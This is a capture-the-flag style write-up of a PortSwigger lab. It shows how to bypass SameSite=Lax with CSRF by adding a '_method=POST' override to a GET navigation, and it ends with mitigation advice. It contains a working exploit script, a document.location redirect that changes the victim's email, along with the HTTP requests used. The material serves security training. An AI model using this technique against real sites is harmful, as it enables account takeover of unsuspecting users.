# 001_en_samesite_lax_bypass_via_method_override.md

# 📘 PortSwigger Lab: SameSite Lax bypass via method override

<a id="top"></a>

🔗 **Official Lab:** https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-lax-restrictions-using-get-requests/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override  
🎯 **Topic:** CSRF — bypassing SameSite Lax via GET method override (`_method` parameter)  
🧪 **Difficulty:** Practitioner  
✅ **Status:** Solved  
🛠 **Tools:** Burp Suite (Proxy, Repeater), Exploit Server, Burp's built-in Chromium browser  
🔑 **Credentials:** `wiener:peter`

---

## 📑 Contents
- [001\_en\_samesite\_lax\_bypass\_via\_method\_override.md](#001_en_samesite_lax_bypass_via_method_overridemd)
- [📘 PortSwigger Lab: SameSite Lax bypass via method override](#-portswigger-lab-samesite-lax-bypass-via-method-override)
  - [📑 Contents](#-contents)
  - [🎯 Goal](#-goal)
  - [🧠 Short Theory](#-short-theory)
  - [🧩 Core Idea](#-core-idea)
  - [🗺 Attack Scheme](#-attack-scheme)
  - [🔍 Step 1 — Analyze the Change Email Function](#-step-1--analyze-the-change-email-function)
  - [🔍 Step 2 — Analyze SameSite Policy](#-step-2--analyze-samesite-policy)
  - [🔍 Step 3 — Bypass via Method Override](#-step-3--bypass-via-method-override)
  - [🔍 Step 4 — Craft the Exploit](#-step-4--craft-the-exploit)
  - [🔍 Step 5 — Test Exploit on Yourself](#-step-5--test-exploit-on-yourself)
  - [🔍 Step 6 — Deliver Exploit to Victim](#-step-6--deliver-exploit-to-victim)
  - [📨 Example Requests](#-example-requests)
  - [📥 Example Result](#-example-result)
  - [🧾 Complete Attack Chain](#-complete-attack-chain)
  - [🔬 Why the Attack Worked](#-why-the-attack-worked)
  - [🧠 Pentester Mindset](#-pentester-mindset)
  - [❌ Common Mistakes](#-common-mistakes)
  - [🛡 Mitigation](#-mitigation)
  - [✅ Checklist](#-checklist)
  - [🧾 Conclusion](#-conclusion)

---

<a id="goal"></a>
## 🎯 Goal
The change email function is vulnerable to CSRF. The session cookie is subject to the browser's **default SameSite=Lax** restrictions (no explicit SameSite attribute is set by the server). The task:

1. Use the exploit server to host an HTML page that performs a CSRF attack.
2. Change the victim's email address via CSRF.

*Note: default SameSite restrictions differ between browsers. The victim uses Chrome — test with Chrome (or Burp's built-in Chromium) to reproduce its Lax behavior.*

*Hint: you cannot register an email address already taken by another user. If you change your own email while testing, use a different address in the final exploit.*

<a id="theory"></a>
## 🧠 Short Theory
SameSite is a cookie attribute controlling whether cookies are sent on cross-site requests:

- `Strict` — cookie is never sent cross-site.
- `Lax` — cookie **is sent** on cross-site **GET** requests that result from a **top-level navigation** (e.g. clicking a link, `document.location`), but **not** on cross-site POST (e.g. auto-submitted forms).
- `None` — cookie is always sent.

If the server does not set a SameSite attribute, modern browsers (Chrome) default to **Lax**. This blocks the classic auto-submitting POST form, but leaves a gap: **cross-site top-level GET navigations still carry the session cookie**.

If the server accepts method override (e.g. a `_method` parameter), a state-changing POST endpoint can be reached **via GET** — a GET navigation is allowed under Lax, so the attacker lands the state-changing request with the victim's session attached.

<a id="idea"></a>
## 🧩 Core Idea
Convert the POST request into a **top-level GET navigation**:

- `POST /my-account/change-email` has no CSRF token — the only defense is SameSite=Lax.
- The endpoint supports **method override**: `?_method=POST` in the query string makes the server treat the GET as POST.
- A GET is exactly what Lax allows cross-site, as long as it's a **top-level navigation** — achieved with `document.location = ...`.

No tokens, no cookie injection — just method override plus Lax's GET navigation exception.

<a id="attack-scheme"></a>
## 🗺 Attack Scheme
1. **Recon:** Intercept `POST /my-account/change-email` — no unpredictable tokens.
2. **Analyze:** `POST /login` response sets the session cookie **without SameSite attribute** → Chrome default Lax.
3. **Verify:** Change request method → GET → endpoint rejects non-POST.
4. **Bypass:** Add `_method=POST` to the query string → GET accepted, email changed.
5. **Exploit:** `document.location` top-level navigation to the crafted GET URL.
6. **Test:** View exploit on yourself → email changed.
7. **Deliver:** Deliver to victim → lab solved.

<a id="step1"></a>
## 🔍 Step 1 — Analyze the Change Email Function
Logged in as `wiener:peter` in Burp's browser and changed the email address. In Proxy > HTTP history studied the request:

```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER
Content-Type: application/x-www-form-urlencoded

email=test@test.com
```

**No CSRF token, no other unpredictable parameters** — the only potential defense is SameSite cookie restrictions.

<a id="step2"></a>
## 🔍 Step 2 — Analyze SameSite Policy
Looked at the response to `POST /login`:

```http
Set-Cookie: session=SESSION_WIENER
```

**No `SameSite` attribute is specified.** Chrome (the victim's browser) therefore applies its **default Lax** level:

- Cross-site POST → session cookie **not** sent → classic form-based CSRF fails.
- Cross-site **top-level GET navigation** → session cookie **is** sent → attack surface remains.

<a id="step3"></a>
## 🔍 Step 3 — Bypass via Method Override
Sent `POST /my-account/change-email` to Repeater. Right-click → **Change request method** — Burp converts it to an equivalent GET:

```http
GET /my-account/change-email?email=test@test.com HTTP/1.1
```

Sent → endpoint **rejects** non-POST requests.

Then added the method-override parameter to the query string:

```http
GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER
```

**Result:** the request was **accepted** — confirmed in the browser that the email address changed.

*Conclusion: the endpoint honors `_method=POST` sent as a query parameter, so the state-changing action is reachable via GET.*

<a id="step4"></a>
## 🔍 Step 4 — Craft the Exploit
The payload must trigger a **top-level navigation** (GET) so that Lax includes the session cookie. Created the exploit on the exploit server:

```html
<script>
    document.location = "https://LAB-ID.web-security-academy.net/my-account/change-email?email=attacker@web-security-academy.net&_method=POST";
</script>
```

- `document.location` performs a top-level navigation → qualifies for Lax's GET exception.
- No `<form>` needed — no cross-site POST is involved at all.

<a id="step5"></a>
## 🔍 Step 5 — Test Exploit on Yourself
Pasted the payload into the exploit server "Body" field, stored it, and clicked "View exploit". Confirmed the email on the target site changed. Then changed the email in the exploit so it doesn't match the current one.

<a id="step6"></a>
## 🔍 Step 6 — Deliver Exploit to Victim
Stored the exploit with the fresh address and clicked "Deliver to victim". The victim's email was changed → lab solved.

<a id="requests"></a>
## 📨 Example Requests
**Legitimate POST (blocked cross-site by Lax)**
```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_VICTIM
Content-Type: application/x-www-form-urlencoded

email=attacker@web-security-academy.net
```

**Direct GET (rejected — wrong method)**
```http
GET /my-account/change-email?email=attacker@web-security-academy.net HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_VICTIM
```

**Method override bypass (accepted)**
```http
GET /my-account/change-email?email=attacker@web-security-academy.net&_method=POST HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_VICTIM
```

<a id="response"></a>
## 📥 Example Result
**Recon**
- `POST /login` response → `Set-Cookie: session=...` with **no SameSite attribute** → Chrome default Lax.

**Method Override Test**
- GET without `_method` → rejected (endpoint only allows POST).
- GET with `_method=POST` → 302 Redirect (success), email changed.

**Exploit**
- Victim's browser navigates cross-site to the GET URL → session cookie included (Lax top-level navigation) → email changed.

<a id="attack-chain"></a>
## 🧾 Complete Attack Chain
1. Change email as wiener → confirm no CSRF token on `POST /my-account/change-email`.
2. Inspect `POST /login` response → session cookie without SameSite → default Lax.
3. Repeater: Change request method → GET → rejected.
4. Add `_method=POST` → accepted → method override confirmed.
5. Exploit: `<script>document.location = "...?email=...&_method=POST";</script>`.
6. View exploit → test on yourself → email changed.
7. Fresh email address → Deliver to victim → **Solved**.

<a id="breakdown"></a>
## 🔬 Why the Attack Worked
- **Default Lax, not Strict:** the server omits the SameSite attribute; Chrome fills the gap with Lax, which still allows cross-site top-level GET navigations.
- **Method override:** the `_method` parameter lets the attacker invoke a POST-only handler via GET — the endpoint's method restriction is bypassable by design.
- **No CSRF token:** without an unpredictable token, the method override + GET navigation is sufficient.
- **Top-level navigation:** `document.location` satisfies Lax's requirement that cross-site GETs originate from top-level navigation, so the session cookie is attached.
- **GET state-changing:** the application violates HTTP semantics — a state-changing operation is reachable through GET.

<a id="pentester"></a>
## 🧠 Pentester Mindset
1. **Check the Set-Cookie on login:** no SameSite attribute → browser default (usually Lax in Chrome) applies.
2. **Think about what Lax allows:** cross-site top-level GET navigations — plan the attack around GET.
3. **Look for method override parameters:** `_method`, `_httpMethod`, Rails/Spring/Laravel-style overrides turn POST-only endpoints into GET-reachable targets.
4. **Test state-changing GET:** if a POST endpoint can be invoked via GET, SameSite Lax loses most of its value.
5. **Use the right browser:** Lax defaults differ between browsers — test in the same engine as the victim (Chrome/Chromium).

<a id="mistakes"></a>
## ❌ Common Mistakes
- **Using an auto-submitting POST form:** Lax blocks cross-site POST — the session cookie isn't sent; the attack must be a GET navigation.
- **Forgetting `_method=POST`:** a plain GET to the endpoint is rejected — without the override parameter the request never reaches the handler.
- **Not using top-level navigation:** requests triggered from an `<img>`/`fetch` are not top-level navigations — under Lax the cookie may not be sent; `document.location` is the reliable primitive.
- **Testing in Firefox:** Firefox's default SameSite behavior differs from Chrome; the lab victim uses Chrome — use Burp's built-in Chromium.
- **Same email in test and final exploit:** emails are unique; the final exploit needs a different address.
- **Not URL-encoding the email in Repeater:** `@` → `%40` when crafting the query string manually.

<a id="defense"></a>
## 🛡 Mitigation
- **Explicitly set SameSite cookies** — `Strict` (or `Lax` only for truly safe GET navigations) for session cookies; never rely on browser defaults.
- **Do not support method override on security-sensitive endpoints** — or at minimum ensure the CSRF protection applies to the **effective** method, not the wire method.
- **CSRF tokens** on all state-changing requests regardless of method.
- **Do not implement state-changing GET** — follow HTTP method semantics.
- Check **Origin/Referer** headers for state-changing requests.

<a id="checklist"></a>
## ✅ Checklist
- [ ] Confirmed: no CSRF token on POST /my-account/change-email
- [ ] Confirmed: session cookie set without SameSite → default Lax
- [ ] GET without override → rejected; with `_method=POST` → accepted
- [ ] Exploit uses top-level navigation (`document.location`)
- [ ] View exploit → tested on yourself → email changed
- [ ] Fresh, non-matching email in the final exploit
- [ ] Deliver to victim → lab solved
- [ ] Status: **Solved**

<a id="conclusion"></a>
## 🧾 Conclusion
The lab demonstrates that SameSite=Lax is not a complete CSRF defense: it blocks cross-site POST but permits top-level GET navigations. Combined with a method-override feature (`_method=POST`), a POST-only, token-less endpoint becomes fully reachable via GET. The key lesson: protection layers must be analyzed as a system — Lax covers one vector, but any mechanism that turns POST into GET (method override) restores the attacker's access. Set SameSite explicitly, issue CSRF tokens, and never let security depend on HTTP method conventions that the application itself can override.

⬆ [Back to top](#top)